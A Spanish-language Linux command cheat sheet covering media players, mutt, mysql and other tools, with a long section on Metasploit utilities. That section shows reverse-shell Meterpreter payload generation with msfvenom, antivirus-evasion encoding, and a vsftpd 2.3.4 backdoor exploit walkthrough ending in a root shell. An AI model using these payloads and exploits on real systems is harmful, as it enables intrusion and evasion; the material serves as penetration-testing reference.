$ find . -type f -iname '*.mp3' -print0 | xargs -0 mp3gain -r -k (genera una lista de los archivos mp3 contenidos en la carpeta actual, crea una tuberia con el resultado de la lista, y normaliza)
$ find directorio -iname “*.mp3″ -exec mp3gain -r -k -m 5 (normaliza un directorio y sus subdirectorios)


mp3info
Información sobre las etiquetas ID3 de archivos mp3blaster
$ mp3info archivo.mp3 (Ver la información ID3)
$ mp3info -t titulo -a artista -l album -y año -c comentario -n pista -g genero archivo.mp3
(Entrar información ID3 para un archivo mp3)


mp3rename
Renombra ficheros mp3 según sus propias etiquetas [id3 tag]
$ mp3rename -s '&a_&t' (establecer las opciones predeterminadas las cuales quedan anotadas en ~/.mp3rename)
Opciones:
	&a  (artista), &b (album), &k (pista), &t (título), &y (año)
$ mp3rename *.mp3  (renombrará segun las opciones predeterminadas)
$ mp3rename -i *.mp3 (muestra los id3 tag de todos los mp3)
	Nota.- No siempre los id3tag estan disponibles o están completos


mp3report
Programa para escanear una lista de directorios y subdirectorios creando un informe desde una plantilla HTML. También calcula varias estadísticas y duración de cada canción.
$ mp3report --title=Titulos directorio (especificando un título)
$ mp3report --title=Titulos --outfile=musica.html directorio (especificando archivo de salida)


mpd
(demonio). Reproductor de audio con arquitectura servidor-cliente que gestiona listas de reproducción y bases de datos. Para hacer uso de una interfaz gráfica, es necesario un cliente tipo: sonata, ario, ncmpcpp o pms.Ajustes en la configuración:
# nano /etc/mpd.conf
music_directory	"/home/usuario/Musica"
playlist_directory "/home/usuario/.mpd/playlists"
db_file	"/home/usuario/.mpd/mpd.db"
log_file "/home/usuario/.mpd/mpd.log"
pid_file "/home/usuario/.mpd/mpd.pid"
state_file "/home/usuario/.mpd/mpdstate"
user "usuario"
group "usuario"
bind_to_address "localhost"
port "6600"
Crear los archivos mencionados en la configuración:
$ touch /home/usuario/.mpd/playlists
$ touch /home/usuario/.mpd/mpd.db
$ touch /home/usuario/.mpd/mpd.log
$ touch /home/usuario/.mpd/mpd.pid
$ touch /home/usuario/.mpd/mpdstate
Arrancar el demonio:
$ mpd


mpg123
Reproducir mp3 o urls
$ mpg123 archivo.mp3
$ mpg123 -@ http://uplink.duplexfx.com:8062/


mpgtx
[comandos derivados: mpgsplit, mpgcat, mpgjoin, mpginfo, mpgdemux]. Manipulación de archivos mpeg.
mpgtx -i equivalente a mpginfo
mpgtx -s equivalente a mpgsplit
mpgtx -j equivalente a mpgjoin
mpgtx -j -o equivalente a mpgcat
mpgtx -d equivalente a mpgdemux
$ mpgtx -s archivo.mpg [3:15-] -b cortado.mpg (Dejar de un mpg del minuto 3,15 al final y guardarlo en cortado.mpg)
$ mpgtx -s archivo.mpg [3:15-10:30] -b cortado.mpg (Lo mismo pero dejando del minuto 3,15 al 10,30)
$ mpgtx -100 arhivo.mpg -b cortado (creará 100 trozos del archivo.mpg con los nombres cortado-001, cortado-002...)


mplayer
Reproductor de video
$ mplayer -vo aa movie.avi   (en ascii)
$ mplayer -vo aa:extended:driver=curses:contrast=50 movie.avi
$ mplayer -vo caca movie.avi  (en color)
$ mplayer -vo fbdev file.mpeg  (reproduce en blanco y negro)
$ mplayer -vo fbdev2 file.mpeg (reproduce en color)
$ mplayer -vo fbdev2 -fs -zoom -double file.avi
-vo -help (ver opciones del driver)
$ mplayer -cache 128 -tv driver=v4l2:width=176:height=177 -vo xv tv:// -noborder -geometry "95%:93%" -ontop  (Abre una ventana en la esquina inferior izquierda con imagenes de la webcam)
$ mplayer mms://flux.cxnlive.com/oldiesfm  (Escuchar una emisora)
$ mplayer -nolirc http://5253.live.streamtheworld.com/VIRGINRADIO_DUBAIAAC (Otra forma de escuvhar una emisora)
$ mplayer http://192.168.1.115/img/video.asf -frames 1 -vo jpeg:quality=100:maxfiles=1  (Tomar una imagen [frames 1] de una ubicación en la red)


mpstat
[sysstat]. Escribe en la salida estándar las actividades de cada procesador disponible, siendo el primero el procesador 0. Si no se ha seleccionado ninguna actividad, entonces el informe por defecto es el informe de utilización de la CPU.
# mpstat -P ALL 2 5 (informes de todos los procesadores a intervalos de 2 segundo 5 veces)
# mpstat -u 2 3 (informe de la cpu cada 2 segundos 3 informes)


mpsyt
[mps-youtube]. Reproductor de videos de youtube. Precisa python3
# pip install mps-youtube
Hace uso de aplicaciones externas. Para las descargas aria2.
# apt-get install aria2
# set download_command aria2c --dir=%d --out=%f %u
# set download_command aria2c -s4 -x4 --dir=%d --out=%f %u
$ mpsyt (Lanzar la aplicación)
Una vez lanzada, en el promt de la misma se lanzan los siguientes ajustes:
Y para la reproducción, mpv o mplayer.
$ set player mplayer (para que mplayer sea el reproductor)
$ set player mpv (Para que lo sea mpv)
$ set search_music false (Para que no busque archivos de música [por defecto])
$ set show_video true (Para que los busque de video)
Las busquedas se realizan anteponiendo un punto al video a buscar [.madonna] y el que se desea del listado que aparece se selecciona entrando el número que indica [1,2,3...] y para descargar:
	d número
Para más opciones:
	h
# pip3 install mps-youtube --upgrade (actualizar la aplicación)


mpv
Reproductor de video gobernado exclusivamente con el teclado.
Instalación en el caso de que no se encuentre en los repos:
	# apt-get install git
	# git clone https://github.com/mpv-player/mpv-build.git
	# cd mpv-build/
	# ./update
	# apt-get install devscripts equivs
	# dpkg -i mpv-build-deps_1.0_amd64.deb
	# mk-build-deps
	El comando anterior puede arrojar muchos errores. Ni caso.
	# apt-get -f install
	# debuild -uc -us -b -j2
	# dpkg -i ../mpv_0.3.5_amd64.deb
Archivo de configuración:
$ nano .mpv/config
Algunos ajustes:
geometry=50%:50% (Medida de la pantalla)
fs=yes (Iniciar con pantalla maximazada)
volume=100 (Indicar el volumen por defecto)
cache=50000 (cache de la aplicación)
msgcolor=yes
Algunos atajos:
	q (Salir)
	v (Mostrar /esconder los subtítulos)
	r y t (Cambiar la posición vertical del subtítulo)
	o (1ª pulsación muestra el tiempo transcurrido, 2ª porcentaje y tiempo total)
	p (Pause / Renaudar)
	s (Sacar una captura)
	S (Sacar una captura con los subtítulos)
	f (Pantalla completa)
	m (Silenciar)
	1 y 2 (Aumenta / disminuye constraste)
	3 y 4 (Aclara / oscurece la imagen)
	5 y 6 (Gamma)
	7 y 8 (Aumentar / disminuir brillo)
$ mpv video


mrename
Añade un prefijo al nombre del archivo
$ mrename '*.mp3' vacaciones -m  (sustituye los originales)
$ mrename '*.mp3' vacaciones -c  (los copia con el prefijo)


mrxvt
Emulador de terminal
Opciones:
-geometry 100x15 (Especificando medidas)
-title "Terminal linux" (Especificando título)
-o 20  (Nivel de transparencia. De 0 a 100)
-pixmap imagen (Con una imagen de fondo)
-bg red  (color de fondo)
-fg white (color de fuente)


msfbinscan
Utilidad para analizar archivos binarios y detectar patrones que podrían corresponder a payloads generados con Metasploit.
# msfbinscan -o -f archivo.bin -s .text (despliega la salida en formato detallado y analizaría la sección .text del archivo en busca de shellcode o patrones conocidos)


msfcli
Interfaz de línea de comandos que permite ejecutar exploits y módulos directamente sin entrar en msfconsole que lo ha reemplazado.
# msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 E (usando el exploit que afecta a sistemas Windows a través de SMB, el payload que genera una sesión de Meterpreter inversa, LHOST la dirección IP del atacante, LPORT es el puerto esperando la conexión inversa y la opción E ejecuta el exploit)
# msfcli exploit/windows/smb/ms08_067_netapi O (muestra las opciones del payload)


msfconsole
[metasploit]. Consola centralizada con acceso a todo las opciones disponibles de Metasploit Framework, única soportada y estable con soporte para de edición de lineas (readline), que permite tabulacion y ejecución de comandos externos.
	msf > ping -c 1 192.168.1.10 (usar ping)
	msf > nmap 192.168.1.10 (usar nmnap)
	msf > help (ayuda)
	msf > show (mostrar módulos disponibles)
	msf > show auxiliary (mostrar módulos auxiliares [scanners, modulos de denial of service, fuzzers...]
	msf > show exploits (obtener una lista de todos los exploits)
	msf > show payloads (mostrar listado de los diferentes payloads y para las plataformas disponibles)
Nota.- Cuando se está usando un determinado exploit, "show payloads" solo mostrará los que son compatibles para ese exploit concreto.
	msf exploit(ms08_067_netapi) > show options (Seleccionado un módulo y mostrar opciones disponibles y/o requeridas para ese concreto)
	msf exploit(ms08_067_netapi) > show targets (mostrar objetivos soportados)
	msf exploit(ms08_067_netapi) > show advanced (mostrar las opciones avanzadas de un exploit)
	msf > search ms09-001 (buscar cadenas de texto dentro del módulo)
	msf > info dos/windows/smb/ms09_001_write (información detallada [opciones, objetivos....] sobre un determinado modulo)
	msf > use dos/windows/smb/ms09_001_write (escogido el módulo en particular, seleccionarlo con)
	msf auxiliary(ms09_001_write) > show options (mirar sus opciones requeridas)
	msf > connect 192.168.1.10 23 (conectar a una Ip y a un puerto)
	msf auxiliary(ms09_001_write) > set RHOST 192.168.1.10 (configurar las opciones del modulo que se está utilizando)
	msf auxiliary(ms09_001_write) > show options (comprobar de nuevo las opciones del módulo)
	msf exploit(ms08_067_netapi) > show encoders (mostrar codificaciones disponibles)
	msf exploit(ms08_067_netapi) > set encoder x86/shikata_ga_nai (escoger la deseada)
	msf exploit(ms04_045_wins) > check (comprobar si un objetivo es vulnerable a un exploit sin explotar la vulnerabilidad)
	msf > unset RHOST (suprimir una variable entrada para un módulo)
	msf auxiliary(ms09_001_write) > run (lanzar un exploit)
	msf auxiliary(ms09_001_write) > back (salir del módulo)
	msf > irb (cambiar al modo de edición de scripts en ruby)
1.-
Para establecer una variable global [setg - save]:
	msf > setg RHOST 192.168.1.136
	RHOST => 192.168.1.136
	msf > save
	Saved configuration to: /root/.msf3/config
	msf > unsetg RHOST (suprimir una variable global)
2.-
Algunos comandos relacionados con la base de datos propia de metasploit:
	msf > db_status (Mostrar el estado de la conexión a la BDs y nombre)
	msf > db_nmap 192.168.1.10 (Lanzar nmap y guardar el resultado en la BDs)
	msf > hosts (Muestra todos los informes de la BDs)
	msf > hosts 192.168.1.10 (Muestra sólo el informe de la ip especificada)
	msf > services (Muestra todos los servicios de la BDs incluso los inactivos)
	msf > services -u -R 192.168.1.10 (Muestra los servicios activos [u] del host especificado [R])
3.-
Ejemplo de muestra de un scan de puertos:
	msf > search portscan (exploradores de puertos disponibles)
	Nota.- Los escáners y la mayoría de módulos auxiliares usan la opción RHOSTS en vez de RHOST y puede ser un rango de IP [192.168.1.10-192.168.1.50], rangos CIDR (192.168.1.0/24), múltiples rangos separados por comas (192.168.1.0/24, 192.168.3.0/24) y una lista en un archivo con una ip por linea (file:/tmp/hostlist.txt).
	msf > use scanner/portscan/tcp ((para escoger el escaneador de puertos a usar)
	msf > auxiliary(tcp) > show options (comprobar si falta algún parámetro [RHOSTS])
	msf > auxiliary(tcp) > set RHOSTS 192.168.1.10 (entrar la ip donde dirigir el escaneo)
	msf > auxiliary(tcp) > run (arancar el escaneo)
Todos los módulos scanner tiene el valor THREADS en "1". Este valor establece el número de subprocesos simultaneos que se utilizan durante la exploración. Un número superior acelera las exploraciones pero aumenta el tráfico en la red.
	msf > set THREADS 50 (para modificar el valor)
4.-
Ejemplo de muestra de un ataque
        maf > use exploit/unix/ftp/vsftpd_234_backdoor
Comprobar parámetros que faltan:
	msf > exploit(vsftpd_234_backdoor) > show options
Entrar el parámetro RHOST [la IP atacada]
	msf > exploit(vsftpd_234_backdoor) > set RHOST 192.168.1.10
Comprobar nuevamente si el parámetro ha entrado correctamente:
	msf > exploit(vsftpd_234_backdoor) > show options
Lanzar el exploit en segundo plano [j] y mostrando una salida positiva en la que se abre una shell en la máquina remota:
	msf > exploit(vsftpd_234_backdoor) > exploit -j
	[*] Exploit running as background job.
	[*] Banner: 220 (vsFTPD 2.3.4)
	[*] USERR: 331 Please specify the password.
	msf exploit(vsftpd_234_backdoor) > [+] Backdoor service has been spawned, handling...
	[+] UID: uid=0(root) gid=0(root)
	[*] Found shell.
	[*] Command shell session 1 opened (192.168.1.15:49654 -> 192.168.1.10:6200) at 2013-07-07 08:06:30 -0400
	msf > exploit(vsftpd_234_backdoor) > sessions -l (mostrar las sesiones abiertas [ID de la sesion, puertos abiertos, máquina remota, local...])
	msf > exploit(vsftpd_234_backdoor) > sessions -c ifconfig (ejecutar un comando en todas las shells abiertas y mostradas con sessions -l)
	msf > exploit(vsftpd_234_backdoor) > sessions -i 1 (entrar en la session con ID 1)
	[*] Starting interaction with 1...
A partir de este punto estamos en una shell clásica de linux del host 192.168.1.10 donde podemos usar todos los comandos propios de dichas shells.


msfd
daemon de Metasploit que permite conexiones remotas a través de un socket TCP.
# msfd -S -a 127.0.0.1 -p 55553 (-S iniciar una shell interactiva, -a el daemon se ejecuta en localhost y -p establece el puerto del socket TCP)
Para conectar a este daemon desde otra terminal:
# nc 127.0.0.1 55553


msfdb
Administra la base de datos que Metasploit utiliza para almacenar información sobre los objetivos, vulnerabilidades, sesiones, etc.
# msfdb init (inicializar y configurar una base de datos PostgreSQL para Metasploit)
# msfdb start (arrancar la base de datos para que Metasploit pueda conectarse a ella)
# msfdb stop (detener la base de datos)
# msfdb restart (reiniciar la base de datos)
# msfdb delete (eliminar la base de datos)


msfelfscan
Se utiliza para escanear archivos ELF [Executable and Linkable Format] en busca de gadgets ROP [Return Oriented Programming], que son útiles para los exploits basados en desbordamientos de búfer.
# msfelfscan -j /ruta/archivo (escanear un archivo ELF en busca de gadgets ROP)
# msfelfscan -r /ruta//archivo (escanear un ELF en busca de secuencias que terminen en una instrucción de retorno)


msfencode
Usado para ofuscar o modificar payloads generados con Metasploit. Hoy en día, esta funcionalidad se ha integrado dentro del comando msfvenom.
# msfencode -e x86/shikata_ga_nai -i shellcode.bin -o encoded.bin -c 3 (usando el encodificado especificado para evadir antivirus, archivo de entrada del payload original, archivo de salida con el shellcode codificado y que el payload será codificado 3 veces)
# msfencode -e x86/shikata_ga_nai -i shellcode.bin -o encoded.bin -t exe -b '\x00\x0a' (-t para generar un archivo ejecutable y -b excluye ciertos caracteres por ejemplo, \x00 y \x0a para evitar bytes nulos)


msfmachscan
Se utiliza para escanear archivos ejecutables Mach-O, el formato de archivo ejecutable utilizado por macOS, en busca de gadgets ROP [Return Oriented Programming] o para obtener detalles técnicos de los archivos ejecutables.
# msfmachscan -j /ruta/a/archivo_mach-o (escanea el archivo en busca de gadgets ROP)
# msfmachscan -r /ruta/a/archivo_mach-o (busca secuencias de retorno)
# msfmachscan /ruta/a/archivo_mach-o (proporciona información detallada sobre las secciones y los encabezados del archivo)


msfpayload
Utilizado obsolera para generar payloads de manera sencilla, pero ha sido reemplazado por msfvenom, que combina tanto msfpayload como msfencode en una sola herramienta.
# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 R > shell.exe (generar un payload de tipo Meterpreter para Windows con una conexión reversa al host y puerto indicados y guardarlo en shell,exe)
Dado que msfpayload ha sido reemplazado, el comando actual sería:
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe


msfpescan
Escanea archivos ejecutables PE [Portable Executable], el formato utilizado en Windows en busca de gadgets ROP, secuencias de retorno, o analiza el archivo en busca de datos.
# msfpescan -j /ruta/a/archivo_pe (busca gadgets ROP dentro del archivo PE)
# msfpescan -r /ruta/a/archivo_pe (busca secuencias que terminan con una instrucción de retorno)
# msfpescan -h /ruta/a/archivo_pe (obtener detalles sobre los encabezados y las secciones del archivo PE)


msfremove
Se utiliza para eliminar módulos antiguos o innecesarios de Metasploit Framework.
# msfremove exploit/windows/smb/ms17_010_eternalblue (eliminar el exploit mencionado)
# msfremove auxiliary/scanner/smb/smb_version exploit/windows/smb/ms08_067_netapi (eliminar varios múdulos)
# msfremove --list (muestra lista de módulos que se pueden eliminar)


msfrop
Se utiliza para identificar gadgets ROP [Return Oriented Programming] en archivos ejecutables o bibliotecas. Estos gadgets son fragmentos de código que terminan en una instrucción de retorno y pueden ser usados en exploits.
# msfrop /ruta/a/archivo_elf (escanear el archivo ELF especificado en busca de gadgets ROP)
# msfrop -f pop /ruta/a/archivo_elf (filtrar los gadgets que contienen la instrucción pop)
# msfrop -s /ruta/a/archivo_elf (muestra el tamaño de las instrucciones que forman los gadgets)


msfrpc
Es un cliente que se conecta a la API RPC de Metasploit, permitiendo a los usuarios controlar Metasploit de forma remota.
# msfrpc -P password -U msf -a 127.0.0.1 -p 55552 (-P contraseña para autenticarte en el servidor RPC, -U nombre de usuario [msf por defecto], -a dirección IP del servidor RPC y puerto donde corre el servidor RPC)
Una vez conectado, se puede ejecutar comandos y tareas en Metasploit, por ejemplo, creando una consola y ejecutando el comando para usar un exploit:
    rpc.call('console.create')
    rpc.call('console.write', [console_id, "use exploit/multi/handler\n"])


msfrpcd
inicia un demonio que proporciona una API RPC para que otros programas o scripts puedan interactuar con Metasploit.
# msfrpcd -U msf -P password -a 127.0.0.1 -p 55552 (-U nombre de usuario para conectarse, -P contraseña, -a donde el daemon RPC estará escuchando y númro de puerto de escucha)
# msfrpcd -S -a 127.0.0.1 -p 55552 (iniciar el demonio sin necesidad de autenticación)
# msfrpcd -U msf -P password -a 127.0.0.1 -p 55552 -S (-S habilita el uso de SSL para las conexiones RPC)


msfupdate
Actualiza el Metasploit Framework a la versión más reciente disponible desde los repositorios oficiales.
# msfupdate


msfvenom
Combina las funciones de las antiguas herramientas msfpayload y msfencode para generar y codificar payloads en una sola utilidad.
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe (-p Meterpreter con conexión inversa, LHOST donde el sistema comprometido se conectará, LPORT donde se espera la conexión, -f formato de salida como un archivo ejecutable de Windows y -o guarda el archivo con el nombre shell.exe)
# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -i 3 -f elf -o shell.elf (-e un codificador, -b excluye ciertos bytes y -i número de iteraciones para codificar el payload)
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c  (genera un payload en formato de código C, que puede ser inyectado directamente en un programa)


mtar
Tar para máquinas con multiples cores. La sintaxis es igual que la de tar [ver]


mtr
Aplicación que combina las funcionalidades de traceroute y ping, probando cada uno de los saltos que hay desde que un paquete se envía hasta que llega a su destino.
# mtr -f tuxapuntes.com (sin el -f se muestra de forma gráfica)
# mtr --tcp --port 80 --report --report-cycles 10
Atajos mientras está la aplicación ejecutándose:
	h ayuda
	d modo de visualización
	r reiniciar
	o orden de los campos
	q salir


mtd-utils
Utilidades para manipular dispositivos con tecnología de memoria, como memoria flash, Disk-On-Chip o ROM. Incluye las siguientes herramientas: docfdisk, doc_loadbios, flashcp, flash_erase, flash_eraseall, flash_lock, flash_otp_dump, flash_otp_info, flash_otp_lock, flash_otp_write, flash_unlock, ftl_check, ftl_format, jffs2dump, jffs2reader, lsmtd, mkfs.jffs2, mkfs.ubifs, mtd_debug, mtdinfo, mtdpart, nanddump, nandtest, nandwrite, nftldump, nftl_format, recv_image, rfddump, rfdformat, serve_image, sumtool, ubiattach, ubiblock, ubicrc32, ubidetach, ubiformat, ubihealthd, ubimkvol, ubinfo, ubinize, ubirename, ubirmvol, ubirsvol, ubiupdatevol.


multitail
Abrir en una ventana varios procesos tail.
$ multitail /var/log/messagess /var/log/apache2/access.log
$ multitail -R 2 -l "netstat -t" -ci green /var/log/apache2/access.log -ci yellow /var/log/apache2/error.log
$ multitail -a netstat.log -R 2 -l "netstat -t tcp" /var/log/apache/access.log
# multitail -n 20 /var/log/dpkg.log (ver las últimas 20 lineas)
# multitail -n 20 -iw 2 /var/log/syslog -i /var/log/sudo.log (ver las 20 últimas filas de dos archivos y actualizar cada 2 segundos)
Algunas opciones:
-ci red (muestra los log en rojo)
-R 2     (actualiza cada 2 segundo)
-l "comando"  (incluir un comando)
-a archivo.log  (crear un archivo con los resultados del comando)
-I  (muestra el log precedido de la "i" mayuscula en la misma ventana que el anterior)
-s 2   (Mostrar el resultado en dos columnas)
-sn 2,3  (Mostrar 2 resultados en la 1ª columna y 3 en la 2ª)
Notas:
	F1 (abrir la ayuda)
	^g (cerrar ventana ayuda)
	b   (selecionar proceso)
	q   (cerrar ventana proceso)
	v   (Cambiar la orientación horizontal/vertical)


munin
Monitor del sistema via web. Permite, mediante plugins, monitorizar varios servicios. Funciona en modo cliente/servidor.
# /etc/init.d/munin start
Y colocar en el navegador: file:///var/cache/munin/www/index.html


mupdf
Visor de archivos pdf
$ mupdf -b 8 -r 150 archivo.pdf (con la máxima calidad [de 0 a 8] y a 150 dpi de resolución [por defecto 72] si el pdf requiriese contraseña se añadiría con “-p contraseña”)
Arrancada la aplicación, algunas teclas de control son:
	L M (Voltea el pdf)
	h j k l (scroll arriba/abajo y derecha/izquierda)
	+ - (Aumentar/diminuir medida del texto)
	15g (Ir a la página 15)
	/ (Abre diálogo “buscar texto”)
	n N (Ir a la siguiente/anterior busqueda)
	. , (Página siguiente, página anterior)


muraster
Convierte páginas PDF en imágenes.
$ muraster -F ppm -o file.ppm entrada.pdf 1,2 (en formato ppm con el nombre especificado de las páginas 1 y 2 de entrada.pdf)


music123
Reproductor de música.
$ music123 tema.mp3
$ music123 tema1.mp3 tema2.wav tema3.ogg (Reproducir varios títulos)
$ music123 -z -r . (Reproducir todos los temas del presente directorio [r .] de forma aleatoria [z])
$ music123 -Z -q -r /rock (Reproducir sin fin [Z] el directorio especificado y sin mostrar salida en la consola [q])
$ music123 -d 2 -r . (esperar 2 segundos entre tema y tema)
$ music123 -r /rock tema1.mp3 /folk tema2.wav (Reproducir dos temas de dos directorios distintos)


mutagen-inspect
Muestra información sobre un archivo de audio y sus etiquetas. Está pensado principalmente como herramienta de depuración para Mutagen que es un módulo de Python para manejar metadatos de audio.
$ mutagen-inspect audio.mp3


mutool
[mupdf-tool] Muestra información y caracteristicas de un pdf.
$ mutool info file.pdf (caracteristicas del pdf)
$ mutool show file.pdf (muestra información del pdf)
$ mutool extract file.pdf (extrae las imágenes)
$ mutool show file.pdf (mostrar objetos internos del pdf)
$ mutool clean file.pdf (reescribe el pdf con salida out.pdf)


mutt
Gestión del correo por consola
$ nano /home/usuario/.muttrc
y añadir:
	set imap_user = 'tu-correo@gmail.com'
	set imap_pass = 'contraseña'
	set spoolfile = imaps://imap.gmail.com:993/INBOX
	set folder = imaps://imap.gmail.com:993
	set record=”imaps://imap.gmail.com/[Gmail]/Sent Mail”
	set postponed=”imaps://imap.gmail.com/[Gmail]/Drafts”
	set header_cache=”~/.mutt/cache/headers”
	set message_cachedir=”~/.mutt/cache/bodies”
	set certificate_file=~/.mutt/certificates
Guardar.
# mutt  (Para arrancar la aplicación en ncurses)
$ echo | mutt -a paquete.tar.gz -s 'el paquete' -c juanito@gmail.com -b pedrito@correo.com  (enviar un paquete[-a], asunto[-s], otro destinatario[cc] y otro en copia oculta[bcc]
$ mutt -s "asunto" destinatario@correo.com <<< "mensaje a enviar"
$ echo "Esto es una prueba" | mutt  -s 'asunto' destinatario@correo.com
$ cat texto.txt | mutt -s "asunto" destinatario@correo.com


mv
Mover o renombrar archivos o directorios
$ mv archivo archivo2 (renombrar "archivo" a "archivo2")
$ mv /home/usuario/index.html /var/www/  (mover archivo a otro directorio)
$ mv -i (Pide confirmación de sobreescritura si existe el archivo o directorio)
$ mv -f (Sobreescribe sin preguntar)


mypager
Colorear la salida de las bases de datos de mysql/postgresql. Una vez entrado en la aplicación SQL.
	mysql> pager base_de_datos


mysecureshell
Herramienta creada para aportar más funcionalidades al protocolo sftp/scp ofrecido por OpenSSH y ofrecer la potencia y seguridad de OpenSSH, con funciones mejoradas (como ACL) para restringir los usuarios conectados.
Crear un usuario con la shell restringida. Tambien puede hacerse desde la propia aplicaicón (ver):
	$ useradd -m -s /bin/MySecureShell USER
	$ passwd USER
$ MySecureShell --configtest (comprobacion de la configuración de un usuario)
MySecureShell viene con algunas utilidades que facilitan la administración y el control de las cuentas SFTP y del mismo MySecureShell.
$ sftp-who (muestra los usuarios SFTP que están conectados)
$ sftp-kill USER (Desconectar a un usuario)
$ sftp-state (vireficar el estado de la aplicación)
$ sftp-verif (comprueba la existencia y los permisos de los distintos archivos)
$ sftp-user list (muestra todas las cuentas de usuario habilitadas para SFTP)
$ sftp-user delete USER (eliminar una cuenta de usuario SFTP)
$ sftp-user create USER (crear un usuario)
Un ejemplo de configuración básica:
# nano /etc/ssh/sftp_config
<Group sftp>
        Download                50k     # limitar velocidad de descarga por conexión
        Upload                  0       # Velocidad de subida ilimitada por conexión
        StayAtHome              true    # limitar al usuario a su directorio home
        VirtualChroot           true    # falsifica un chroot a la cuenta de inicio
        LimitConnectionByUser   1       # conexión máxima para cada cuenta
        LimitConnectionByIP     1       # conexión máxima por IP para cada cuenta
        IdleTimeOut             300     # desconectar por inactividad (en segundos)
        HideNoAccess            true    # ocultar archivo/directorio al que el usuario no tiene acceso
</Group>


mysql
Gestor de bases de datos [BDs]. Las BDs se guardan en el directorio /var/lib/mysql/
$ mysqldump -u root -p proveedores > fichero.sql (Crear un backup de la BD "proveedores".)
$ mysql -u root -p proveedores < fichero.sql (Restaurar la BD "proveedores" de un archivo)
$ mysqlimport -u root -p clientes fichero.sql (Otra forma de restaurar una BD si esta ya existe)
$ mysqldump -u root -p --all-databases > fichero.sql (Backup de todas las BDs)
$ mysqldump -u root -p clientes proveedores > fichero.sql (Backup de dos BDs)
$ mysqldump -u root -p proveedores --ignore-table=antiguos > fichero.sql (Backup ignorando una tabla)
$ mysqldump -u root -p base_de_datos tabla1 tabla2 > tabla1_y_tabla2.sql (Exportar solo unas tablas de una BDs)
$ mysql -u root -p1234 (Acceder a la BD con el usuario "root" y contraseña "1234"[nótese que la contraseña está junto a la "p")
$ mysql -u root -p (Pedirá contraseña para acceder a la BD con el usuario "root")
$ mysql -u root -p datos (Entrar en mysql y directamente en la BD "datos" [notese que la BDs está separada de la "p" por un espacio, sinó se tomaría como la contraseña])
Una vez en el prompt de mysql [Todas las sentencias han de terminar con un punto y coma [;] menos la sentencia "USE"]:
	mysql> SHOW VARIABLES LIKE 'datadir'; (muestra el directorio donde se almacenan las BDs)
	mysql> show databases; (Mostrar las BDs existentes)
	mysql> create database datos; (Crear la BD "datos")
	mysql> DROP DATABASE datos; (Borrar toda una base de datos. El directorio /var/lib/mysql/datos/ tiene que estar vacio)
	mysql> USE datos (Entrar en la BD "datos". Sin punto y coma final)
	mysql> show tables; (Mostrar las tablas de la BD en la que se ha entrado)
	mysql> DESCRIBE una_tabla (Mostrar los campos de una tabla concreta)
	mysql> exit (Salir de mysql. Tambien con "quid" o Ctrl+d)
	mysql> select version(), current_date; (Mostrar versión de mysql y fecha)
	mysql> SET lc_messages = 'es_ES'; (Que los mensajes de error salgan en español)
Resumen de comandos:
    CREATE DATABASE (rear nueva base de datos vacía)
    DROP DATABASE (eliminar completamente una base de datos existente)
    CREATE TABLE (crear nueva tabla)
    ALTER TABLE (modificar una tabla ya existente)
    DROP TABLE (eliminar por completo una tabla existente)
    SELECT (leer o seleccionar datos)
    INSERT (añadir o insertar nuevos datos)
    UPDATE (cambiar o actualizar datos existentes)
    DELETE (eliminar o borrar datos existentes)
    REPLACE (añadir, cambiar o reemplazar datos nuevos o ya existentes)
    TRUNCATE (vaciar o borrar todos los datos de la plantilla)
Modelo de creación de una tabla dentro de una BD mysql:
Nota: en caso de equivocación podemos suspender la entrada de datos con \\n . Si existe alguna comilla abierta, primero ha de cerrarse antes de lanzar \\n
    mysql> CREATE TABLE usuarios(
    -> nombre VARCHAR(20), apellido VARCHAR(20),
    -> profesión VARCHAR(20), sexo CHAR(1), nacimiento DATE,
    -> antiguedad DATE);
VARCHAR(20) (Que los valores que se almacenarán son de longitud variable de hasta 20 caracteres)
CHAR(1) (Que el valor será fijo y solo tendrá un caracter)
DATE (En formato YYYY-MM-DD)
Para entrar datos en la tabla anterior, podemos crear un archivo de texto "usuarios.txt" que contenga un registro por línea con valores separados por tabuladores, cuidando que el orden de las columnas sea el mismo que utilizamos en la sentencia CREATE TABLE. Para valores que no conozcamos podemos usar valores nulos usando \N. Ejemplo:
$ nano usuarios.txt
	Juan	Borras	contable	m	1964-05-12	1988-03-27
	Maria	Gil	administrativo	f	1983-10-03	2004-08-05
	Antonio Gomez	portero		m	\N		2006-11-01
Nota.- El final del archivo no ha de contener ninguna linea en blanco. El archivo tiene que estar en /var/lib/mysql/datos (En el directorio de la misma base de datos donde se carga)
Para cargarlo en la BD:
	mysql> LOAD DATA INFILE "usuarios.txt" INTO TABLE datos;
Nota.- En caso de que salga el error: The used command is not allowed with this MySQL version:
	# nano /etc/mysql/my.cnf
	Y en la sección [mysql] añadir la linea "local-infile":
		[mysql]
		local-infile
	Reinciar mysql.
LOAD DATA (Permite especificar cuál es el separador de columnas y el separador de registros. Por defecto el tabulador es el separador de columnas (campos) y el salto de línea es el separador de registros)
Para añadir un nuevo registro a la BD anterior:
	mysql> INSERT INTO usuarios
	    -> VALUES('Jose','Robles','administrativo','m',NULL,'2012-12-01');
Valores y fechas entre comillas simples y valores desconocidos NULL y no \N como entrando un archivo.
	mysql> SELECT * FROM usuarios; (Ver toda la tabla para comprobar si se ha añadido el último registro)
Para modificar un registro puede realizarse borrando toda la tabla de datos y entrando nuevamente el archivo usuarios.txt si este está actualizado:
	mysql> DELETE FROM usuarios;
	mysql> LOAD DATA INFILE "usuarios.txt" INTO TABLE usuarios;
O modificando solo el registro que corresponda:
	mysql> UPDATE usuarios SET nacimiento="1959-04-12" WHERE apellido="Gomez"; (Modificar campo "nacimiento" del apellido "Gomez"
	mysql> SELECT * FROM usuarios WHERE apellido="Gomez"; (Verificar si se ha realizado la modificación)
	mysql> SELECT * FROM usuarios WHERE nacimiento >= "1990-1-1"; (filtrar los que han nacido antes de la fecha indicada)
	mysql> SELECT * FROM usuarios WHERE profesion="administrativo" AND sexo="f"; (filtrar los administrativos de sexo femenino)
